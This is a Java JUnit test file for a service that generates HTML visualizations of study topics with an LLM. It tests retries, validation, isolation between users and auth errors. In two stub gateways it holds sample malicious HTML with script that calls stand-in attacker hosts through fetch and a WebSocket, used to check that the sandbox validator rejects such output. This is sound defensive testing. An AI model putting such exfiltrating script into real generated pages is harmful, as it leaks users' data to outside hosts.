package com.oneterm.visualize;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.oneterm.common.BusinessException;
import com.oneterm.common.CurrentUser;
import com.oneterm.common.CurrentUserProvider;
import com.oneterm.common.ErrorCode;
import com.oneterm.common.SseEventPublisher;
import com.oneterm.llm.ChatMessage;
import com.oneterm.llm.ChatResult;
import com.oneterm.llm.LlmGateway;
import com.oneterm.llm.LlmStreamListener;
import com.oneterm.llm.MockLlmGateway;
import com.oneterm.llm.MockVisualizationPresets;
import com.oneterm.llm.TokenUsage;
import com.oneterm.visualize.dto.GenerateVisualizationRequest;
import com.oneterm.visualize.dto.VisualizationDto;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.core.io.ClassPathResource;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.jdbc.datasource.DriverManagerDataSource;
import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

class VisualizeServiceTest {

    private JdbcTemplate jdbcTemplate;
    private VisualizationRepository repository;
    private AtomicLong activeUserId;
    private CurrentUserProvider currentUserProvider;
    private RecordingSseEventPublisher ssePublisher;

    @BeforeEach
    void setUp() throws Exception {
        DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName("org.sqlite.JDBC");
        dataSource.setUrl("jdbc:sqlite:target/test-visualize.db");
        this.jdbcTemplate = new JdbcTemplate(dataSource);

        ClassPathResource schemaResource = new ClassPathResource("db/migration/V1__init.sql");
        String sqlScript = new String(schemaResource.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
        for (String statement : sqlScript.split(";")) {
            String trimmed = statement.trim();
            if (!trimmed.isEmpty()) {
                jdbcTemplate.execute(trimmed);
            }
        }

        jdbcTemplate.update("DELETE FROM visualizations");
        jdbcTemplate.update("DELETE FROM review_topics");
        jdbcTemplate.update("DELETE FROM events");
        jdbcTemplate.update("DELETE FROM users");

        jdbcTemplate.update(
                "INSERT INTO users (id, username, password_hash, role, enabled, daily_token_limit) VALUES (1, 'studentA', 'hash', 'USER', 1, 100000)"
        );
        jdbcTemplate.update(
                "INSERT INTO users (id, username, password_hash, role, enabled, daily_token_limit) VALUES (2, 'studentB', 'hash', 'USER', 1, 100000)"
        );

        this.repository = new VisualizationRepository(jdbcTemplate);
        this.activeUserId = new AtomicLong(1L);
        this.currentUserProvider = () -> {
            long uid = activeUserId.get();
            if (uid <= 0) {
                throw new BusinessException(ErrorCode.UNAUTHORIZED);
            }
            return new CurrentUser(uid, "user-" + uid, "USER", 100000);
        };
        this.ssePublisher = new RecordingSseEventPublisher();
    }

    @Test
    @DisplayName("流式生成「冒泡排序」与「TCP 三次握手」应自动创建关联知识点并持久化入库")
    void shouldStreamGenerateAndPersistBubbleSortAndTcpHandshake() {
        VisualizeService service = new VisualizeService(
                repository,
                new MockLlmGateway(),
                currentUserProvider,
                ssePublisher
        );
        VisualizeController controller = new VisualizeController(service);

        controller.generateStream(new GenerateVisualizationRequest(null, null, "冒泡排序"));
        assertNotNull(ssePublisher.lastDoneResult);
        VisualizationDto bubbleDto = (VisualizationDto) ssePublisher.lastDoneResult;
        assertEquals(1L, bubbleDto.userId());
        assertEquals("冒泡排序", bubbleDto.topic());
        assertEquals("v1.0", bubbleDto.promptVersion());
        assertTrue(bubbleDto.html().contains("冒泡排序"));

        controller.generateStream(new GenerateVisualizationRequest(null, null, "TCP 三次握手"));
        VisualizationDto tcpDto = (VisualizationDto) ssePublisher.lastDoneResult;
        assertEquals("TCP 三次握手", tcpDto.topic());
        assertTrue(tcpDto.html().contains("三次握手"));

        List<VisualizationDto> all = controller.listVisualizations(null);
        assertEquals(2, all.size());

        List<VisualizationDto> filtered = controller.listVisualizations(bubbleDto.topicId());
        assertEquals(1, filtered.size());
        assertEquals("冒泡排序", filtered.get(0).topic());
    }

    @Test
    @DisplayName("首次生成校验失败时应自动重试一次大模型，重试通过后正常入库并推送 done")
    void shouldRetryOnceAutomaticallyWhenFirstAttemptFailsSandboxValidation() {
        AtomicInteger callCount = new AtomicInteger(0);
        LlmGateway flakyGateway = new StubLlmGateway() {
            @Override
            public void streamChat(long userId, String kind, List<ChatMessage> messages, LlmStreamListener listener) {
                int attempt = callCount.incrementAndGet();
                if (attempt == 1) {
                    String malicious = "<!DOCTYPE html><html><body><script>fetch('https://evil.example.com/exfil');</script></body></html>";
                    listener.onDelta(malicious);
                    listener.onComplete(new ChatResult(malicious, new TokenUsage(100, 50), "stub-model", true));
                } else {
                    String validHtml = "```html\n" + MockVisualizationPresets.BUBBLE_SORT_HTML + "\n```";
                    listener.onDelta(validHtml);
                    listener.onComplete(new ChatResult(validHtml, new TokenUsage(120, 200), "stub-model", true));
                }
            }
        };

        VisualizeService service = new VisualizeService(
                repository,
                flakyGateway,
                currentUserProvider,
                ssePublisher
        );

        service.streamGenerate(new GenerateVisualizationRequest(null, null, "冒泡排序"));

        assertEquals(2, callCount.get(), "首次校验失败后应自动触发第 2 次大模型生成");
        assertTrue(
                ssePublisher.progressSteps.contains("retrying"),
                "SSE 进度流应包含 retrying 阶段通知"
        );
        assertNotNull(ssePublisher.lastDoneResult, "重试校验通过后应推送 done 事件");
        VisualizationDto saved = (VisualizationDto) ssePublisher.lastDoneResult;
        assertFalse(saved.html().startsWith("```"), "入库前应剥离代码块包裹");
        assertEquals(1, service.listVisualizations(null).size());
    }

    @Test
    @DisplayName("首次与自动重试均未通过安全沙箱校验时，应推送 VALIDATION_FAILED 错误且不入库")
    void shouldEmitValidationFailedErrorWhenRetryAlsoFails() {
        AtomicInteger callCount = new AtomicInteger(0);
        LlmGateway alwaysMaliciousGateway = new StubLlmGateway() {
            @Override
            public void streamChat(long userId, String kind, List<ChatMessage> messages, LlmStreamListener listener) {
                callCount.incrementAndGet();
                String badHtml = "<!DOCTYPE html><html><body><script>new WebSocket('wss://attacker.example.com');</script></body></html>";
                listener.onDelta(badHtml);
                listener.onComplete(new ChatResult(badHtml, new TokenUsage(80, 40), "stub-model", true));
            }
        };

        VisualizeService service = new VisualizeService(
                repository,
                alwaysMaliciousGateway,
                currentUserProvider,
                ssePublisher
        );

        service.streamGenerate(new GenerateVisualizationRequest(null, null, "快速排序"));

        assertEquals(2, callCount.get(), "最多执行首次生成 + 1 次重试，共 2 次调用");
        assertEquals(ErrorCode.VALIDATION_FAILED, ssePublisher.lastErrorCode);
        assertTrue(service.listVisualizations(null).isEmpty(), "校验未通过的结果绝不能存入数据库");
    }

    @Test
    @DisplayName("跨用户租户隔离：用户 B 访问、删除或关联用户 A 的记录时一律抛出 404 NOT_FOUND")
    void shouldEnforceStrictUserIdIsolationAndReturn404OnCrossUserAccess() {
        VisualizeService service = new VisualizeService(
                repository,
                new MockLlmGateway(),
                currentUserProvider,
                ssePublisher
        );
        VisualizeController controller = new VisualizeController(service);

        // 用户 A (id=1) 生成一条可视化记录
        activeUserId.set(1L);
        controller.generateStream(new GenerateVisualizationRequest(null, null, "冒泡排序"));
        VisualizationDto userAViz = (VisualizationDto) ssePublisher.lastDoneResult;
        assertNotNull(userAViz);

        // 切换到用户 B (id=2)
        activeUserId.set(2L);
        assertTrue(controller.listVisualizations(null).isEmpty(), "用户 B 列表查询不应看到用户 A 的记录");

        BusinessException getEx = assertThrows(
                BusinessException.class,
                () -> controller.getVisualization(userAViz.id())
        );
        assertEquals(ErrorCode.NOT_FOUND, getEx.getErrorCode());

        BusinessException deleteEx = assertThrows(
                BusinessException.class,
                () -> controller.deleteVisualization(userAViz.id())
        );
        assertEquals(ErrorCode.NOT_FOUND, deleteEx.getErrorCode());

        BusinessException crossTopicEx = assertThrows(
                BusinessException.class,
                () -> controller.generateStream(new GenerateVisualizationRequest(userAViz.topicId(), null, "冒泡排序"))
        );
        assertEquals(ErrorCode.NOT_FOUND, crossTopicEx.getErrorCode());

        // 切回用户 A，确认记录未被用户 B 破坏且可正常查询与删除
        activeUserId.set(1L);
        VisualizationDto fetched = controller.getVisualization(userAViz.id());
        assertEquals(userAViz.id(), fetched.id());

        Map<String, Object> delRes = controller.deleteVisualization(userAViz.id());
        assertEquals(Boolean.TRUE, delRes.get("success"));
        assertTrue(controller.listVisualizations(null).isEmpty());
    }

    @Test
    @DisplayName("非法知识点类别或未登录访问应返回对应错误码")
    void shouldRejectUnsupportedTopicAndUnauthenticatedUser() {
        VisualizeService service = new VisualizeService(
                repository,
                new MockLlmGateway(),
                currentUserProvider,
                ssePublisher
        );

        BusinessException badTopicEx = assertThrows(
                BusinessException.class,
                () -> service.streamGenerate(new GenerateVisualizationRequest(null, null, "川菜宫保鸡丁炒制方法"))
        );
        assertEquals(ErrorCode.BAD_REQUEST, badTopicEx.getErrorCode());

        activeUserId.set(0L);
        BusinessException unauthEx = assertThrows(
                BusinessException.class,
                () -> service.listVisualizations(null)
        );
        assertEquals(ErrorCode.UNAUTHORIZED, unauthEx.getErrorCode());
    }

    private abstract static class StubLlmGateway implements LlmGateway {
        @Override
        public boolean isMockMode() {
            return true;
        }

        @Override
        public boolean hasActiveEmbeddingModel() {
            return false;
        }

        @Override
        public ChatResult chat(long userId, String kind, List<ChatMessage> messages) {
            return null;
        }

        @Override
        public ChatResult extractTextFromImage(long userId, byte[] imageBytes, String mimeType, String prompt) {
            return null;
        }

        @Override
        public float[] embed(long userId, String text) {
            return new float[0];
        }
    }

    private static class RecordingSseEventPublisher extends SseEventPublisher {
        final List<String> progressSteps = new ArrayList<>();
        final StringBuilder accumulatedDelta = new StringBuilder();
        Object lastDoneResult;
        ErrorCode lastErrorCode;
        String lastErrorMessage;

        RecordingSseEventPublisher() {
            super(new ObjectMapper());
        }

        @Override
        public void sendProgress(SseEmitter emitter, String step, int current, int total, String message) {
            progressSteps.add(step);
            super.sendProgress(emitter, step, current, total, message);
        }

        @Override
        public void sendDelta(SseEmitter emitter, String content) {
            accumulatedDelta.append(content);
            super.sendDelta(emitter, content);
        }

        @Override
        public void sendDone(SseEmitter emitter, Object result, int promptTokens, int completionTokens) {
            this.lastDoneResult = result;
            super.sendDone(emitter, result, promptTokens, completionTokens);
        }

        @Override
        public void sendError(SseEmitter emitter, ErrorCode code, String message) {
            this.lastErrorCode = code;
            this.lastErrorMessage = message;
            super.sendError(emitter, code, message);
        }
    }
}
